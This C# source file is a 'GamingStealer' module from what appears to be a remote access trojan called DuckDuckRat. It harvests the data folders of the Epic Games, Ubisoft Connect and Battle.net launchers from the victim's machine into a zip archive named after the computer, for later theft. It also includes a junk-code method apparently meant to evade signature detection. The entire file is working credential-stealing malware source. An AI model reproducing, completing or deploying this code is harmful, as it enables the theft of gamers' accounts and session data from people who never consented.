using System;
using System.IO;
using System.IO.Compression;
using System.Collections.Generic;
using System.Threading.Tasks;

namespace DuckDuckRat.Modules
{
    public static class GamingStealer
    {
        // [POLY_JUNK]
        private static void _DuckDuckRat_g4m1ng_31337() {
            int val = 99881;
            if (val > 100) Console.WriteLine("Harvesting...");
        }

        public struct StealResult
        {
            public bool Success;
            public string? ZipPath;
            public string Message;
            public int FileCount;
        }

        public static async Task<StealResult> Run()
        {
            string workDir = Path.Combine(Path.GetTempPath(), "DUCK DUCK RAT v1Gaming_" + Guid.NewGuid().ToString("N").Substring(0, 6));
            Directory.CreateDirectory(workDir);

            int count = 0;
            try
            {
                // 1. Epic Games
                string epicLocal = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "EpicGamesLauncher", "Saved");
                if (Directory.Exists(epicLocal))
                {
                    string dest = Path.Combine(workDir, "EpicGames");
                    Directory.CreateDirectory(dest);
                    CopyFolderIfExists(Path.Combine(epicLocal, "Config", "Windows"), Path.Combine(dest, "Config"));
                    CopyFolderIfExists(Path.Combine(epicLocal, "WebCache"), Path.Combine(dest, "WebCache"));
                    count++;
                }

                // 2. Ubisoft Connect
                string ubiLocal = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Ubisoft Game Launcher");
                if (Directory.Exists(ubiLocal))
                {
                    string dest = Path.Combine(workDir, "Ubisoft");
                    Directory.CreateDirectory(dest);
                    CopyFolderIfExists(Path.Combine(ubiLocal, "cache"), Path.Combine(dest, "cache"));
                    count++;
                }

                // 3. Battle.net
                string bnetApp = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Battle.net");
                string bnetLocal = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Battle.net");
                if (Directory.Exists(bnetApp) || Directory.Exists(bnetLocal))
                {
                    string dest = Path.Combine(workDir, "BattleNet");
                    Directory.CreateDirectory(dest);
                    CopyFolderIfExists(bnetApp, Path.Combine(dest, "Roaming"));
                    CopyFolderIfExists(bnetLocal, Path.Combine(dest, "Local"));
                    count++;
                }

                if (count == 0)
                {
                    Directory.Delete(workDir, true);
                    return new StealResult { Success = false, Message = "❌ No game launchers found on this system." };
                }

                string zipPath = Path.Combine(Path.GetTempPath(), $"GamingData_{Environment.MachineName}.zip");
                if (File.Exists(zipPath)) File.Delete(zipPath);
                ZipFile.CreateFromDirectory(workDir, zipPath);
                
                Directory.Delete(workDir, true);

                return new StealResult { 
                    Success = true, 
                    ZipPath = zipPath, 
                    Message = $"✅ Successfully harvested data from {count} launchers.",
                    FileCount = count
                };
            }
            catch (Exception ex)
            {
                if (Directory.Exists(workDir)) Directory.Delete(workDir, true);
                return new StealResult { Success = false, Message = $"❌ Error during harvesting: {ex.Message}" };
            }
        }

        private static void CopyFolderIfExists(string source, string dest)
        {
            if (!Directory.Exists(source)) return;
            try
            {
                Directory.CreateDirectory(dest);
                foreach (string dirPath in Directory.GetDirectories(source, "*", SearchOption.AllDirectories))
                {
                    Directory.CreateDirectory(dirPath.Replace(source, dest));
                }
                foreach (string newPath in Directory.GetFiles(source, "*.*", SearchOption.AllDirectories))
                {
                    try { File.Copy(newPath, newPath.Replace(source, dest), true); } catch { }
                }
            }
            catch { }
        }
    }
}


